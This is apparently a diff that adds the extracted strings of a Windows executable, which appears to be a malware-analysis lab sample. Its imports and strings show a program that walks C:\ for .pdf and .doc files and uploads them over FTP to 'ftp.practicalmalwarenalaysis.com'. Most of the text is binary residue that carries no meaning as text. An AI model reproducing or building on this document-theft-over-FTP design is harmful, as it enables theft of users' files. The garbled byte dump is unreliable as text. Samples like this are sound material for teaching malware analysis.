@@ -1,0 +1,276 @@
+!This program cannot be run in DOS mode.
+$
+,>Rich
+.text
+`.rdata
+@.data
+hHp@
+hDp@
+h@p@
+h8p@
+0z@
+0z@
+h0p@
+h`p@
+hXp@
+Rh0y@
+hLp@
+h`p@
+Rh0y@
+h0y@
+5@z@
+YYÃ|$
+XSVW
+\z@
+Xz@
+j
+XP
+YYËe
+=<z@
+YYÃ=<z@
+áDz@
+j?I_
+u	9}
+=P`@
+ulSj
+uY;]
+pD#U
+j #M
+j?^;
+ tj
+_WPS
+HHtpHHtl
+ Yt	f
+RPWV
+_^[ËD$
+^h p@
+YYh(p@
+h$p@
+@q@
+4I+э4
+5Lq@
+5Lq@
+5Lq@
+[]ËT$
+Hq@
+<"u%
+F<"t
+>"uF
+
+< v
+54z@
+5pz@
+=4z@
+t9UW
+?=t"U
+54z@
+QQS3
+PSSW
+5hz@
+8"uD
+8"uF@
+8"u,
+@@f9
+@@f9
+=x`@
+SS@SSPVSS
+t#SSUP
+t$$VSS
+t
+@8
+_^][YYÃ
+DSUVWh
+_^][
+SVWUj
+]_^[
+]ËL$
+t.;t$$t(
+VC20XC00U
+SVWU
+tEVU
+t3x<
+]_^[
+h@d@
+h<d@
+h d@
+VWss
+%Lz@
+S;@
+=Lz@
+%Lz@
+Yu!j
+X]ÍM
+90tr
+Wj@Y3
+t7SW
+    
+@AA;
+Vt
+P
+VWuBh
+5,`@
+h|d@
+tPhld@
+hXd@
+tzVS
+GIt%
+t/Ku
+It
+3
+[^_ËL$
+3҉Lz@
+V;@
+%Lz@
+_^ËD$
+Ã%Lz@
+u+Vj
+=@z@
+^95 
+F;5 
+F@t
+~&WP
+SVW3
+F;5 
+uFWWj
+"WWSh
+9} u
+E WW
+tMWWS
+t@9}
+VSh 
+_ËD$
+_^ËD$
+SUVW
+%Lz@
+_^][
+s耀9耀
+ (8PX
+700WP
+`h````
+ppxxxx
+(null)
+(null)
+runtime error 
+TLOSS error
+
+SING error
+
+DOMAIN error
+
+R6028
+- unable to initialize heap
+
+R6027
+- not enough space for lowio initialization
+
+R6026
+- not enough space for stdio initialization
+
+R6025
+- pure virtual function call
+
+R6024
+- not enough space for _onexit/atexit table
+
+R6019
+- unable to open console device
+
+R6018
+- unexpected heap error
+
+R6017
+- unexpected multithread lock error
+
+R6016
+- not enough space for thread data
+
+
+abnormal program termination
+
+R6009
+- not enough space for environment
+
+R6008
+- not enough space for arguments
+
+R6002
+- floating point not loaded
+
+Microsoft Visual C++ Runtime Library
+Runtime Error!
+
+Program: 
+<program name unknown>
+GetLastActivePopup
+GetActiveWindow
+MessageBoxA
+user32.dll
+s耀9耀
+FindNextFileA
+FindClose
+FindFirstFileA
+KERNEL32.dll
+InternetCloseHandle
+FtpPutFileA
+FtpSetCurrentDirectoryA
+InternetConnectA
+InternetOpenA
+WININET.dll
+WS2_32.dll
+HeapAlloc
+GetModuleHandleA
+GetStartupInfoA
+GetCommandLineA
+GetVersion
+ExitProcess
+HeapDestroy
+HeapCreate
+VirtualFree
+HeapFree
+VirtualAlloc
+HeapReAlloc
+TerminateProcess
+GetCurrentProcess
+UnhandledExceptionFilter
+GetModuleFileNameA
+FreeEnvironmentStringsA
+FreeEnvironmentStringsW
+WideCharToMultiByte
+GetEnvironmentStrings
+GetEnvironmentStringsW
+SetHandleCount
+GetStdHandle
+GetFileType
+RtlUnwind
+WriteFile
+GetLastError
+SetFilePointer
+GetCPInfo
+GetACP
+GetOEMCP
+GetProcAddress
+LoadLibraryA
+SetStdHandle
+MultiByteToWideChar
+LCMapStringA
+LCMapStringW
+GetStringTypeA
+GetStringTypeW
+FlushFileBuffers
+CloseHandle
+.pdf
+.doc
+%s-%d.pdf
+pdfs
+ftp.practicalmalwarenalaysis.com
+Home ftp client
+%s-%d.doc
+docs
+C:\*
+         
+(((((                  H
+ကကကကကကကကကကကကကက
+ကကကကကကက
+ĀĀĀĀĀĀĀĀĀĀĀĀĀĀĀĀĀĀĀĀ
+ကကကကကက
+ကကကက
